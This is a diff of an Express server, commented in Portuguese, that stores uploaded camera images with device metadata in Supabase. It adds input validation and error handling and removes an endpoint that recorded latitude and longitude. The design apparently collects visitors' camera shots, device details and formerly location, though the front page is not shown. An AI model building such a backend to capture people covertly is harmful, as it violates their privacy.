@@ -1,9 +1,13 @@
 require('dotenv').config();
 const express = require('express');
 const { createClient } = require('@supabase/supabase-js');
+const { randomUUID } = require('crypto');
+const path = require('path');
 const app = express();
 
 app.use(express.json({ limit: '10mb' }));
+
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 
 app.get('/test', (req, res) => {
     console.log("=== ENDPOINT /TEST ACESSADO ===");
@@ -20,30 +24,36 @@ const BUCKET_NAME = 'capturas';
 // Endpoint para capturas de câmera
 app.post('/api/captura', async (req, res) => {
     try {
-        const { timestamp, facingMode, image, userAgent, screenRes } = req.body;
+        const { facingMode, image, userAgent, screenRes } = req.body;
         
-        if (!image) return res.status(400).json({ error: 'Imagem ausente' });
+        if (typeof image !== 'string' || !/^data:image\/jpeg;base64,[A-Za-z0-9+/]+={0,2}$/.test(image)) {
+            return res.status(400).json({ error: 'Imagem JPEG inválida' });
+        }
 
-        // Converte base64 para Buffer
-        const base64Data = image.split(',')[1];
+        const base64Data = image.slice('data:image/jpeg;base64,'.length);
         const binaryData = Buffer.from(base64Data, 'base64');
+        if (!binaryData.length) return res.status(400).json({ error: 'Imagem vazia' });
         
-        // Gera um nome de arquivo único
-        const fileName = `cap_${timestamp.replace(/[:.]/g, '-')}_${facingMode}.jpg`;
+        const fileName = `cap_${Date.now()}_${randomUUID()}.jpg`;
         
-        // 1. Envia a imagem para o Storage
         const { error: uploadError } = await supabase.storage
             .from(BUCKET_NAME)
             .upload(fileName, binaryData, { contentType: 'image/jpeg' });
 
-        if (uploadError) throw uploadError;
+        if (uploadError) {
+            console.error('Falha no Supabase Storage:', uploadError);
+            return res.status(502).json({
+                error: 'O Supabase recusou o envio da imagem',
+                stage: 'storage',
+                detail: uploadError.message
+            });
+        }
 
         // Obtém a URL pública da imagem
         const { data: { publicUrl } } = supabase.storage
             .from(BUCKET_NAME)
             .getPublicUrl(fileName);
 
-        // 2. Salva os metadados no Banco de Dados
         const { error: insertError } = await supabase.from('metadados').insert({
             timestamp: new Date().toISOString(),
             facing_mode: facingMode,
@@ -52,34 +62,20 @@ app.post('/api/captura', async (req, res) => {
             image_url: publicUrl
         });
 
-        if (insertError) throw insertError;
+        if (insertError) {
+            console.error('Imagem enviada, mas falha ao salvar metadados:', insertError);
+            return res.status(502).json({
+                error: 'Imagem enviada, mas os metadados não foram salvos',
+                stage: 'database',
+                detail: insertError.message,
+                fileName
+            });
+        }
 
         console.log(`Imagem enviada para Supabase: ${publicUrl}`);
         res.status(200).json({ success: true, imageUrl: publicUrl });
     } catch (err) {
         console.error('Erro no /api/captura:', err);
-        res.status(500).json({ error: err.message });
-    }
-});
-
-// Endpoint para geolocalização
-app.post('/api/geolocalizacao', async (req, res) => {
-    try {
-        const { lat, lon, accuracy } = req.body;
-        
-        // Atualiza o último registro com a geolocalização
-        // Ou insere um novo registro específico para geo
-        const { error } = await supabase.from('metadados').update({
-            lat: lat,
-            lon: lon
-        }).eq('id', (await supabase.from('metadados').select('id').order('timestamp', { ascending: false }).limit(1).single()).data.id);
-        
-        if (error) throw error;
-        
-        console.log(`Geolocalização atualizada: ${lat}, ${lon}`);
-        res.status(200).json({ success: true });
-    } catch (err) {
-        console.error('Erro no /api/geolocalizacao:', err);
         res.status(500).json({ error: err.message });
     }
 });
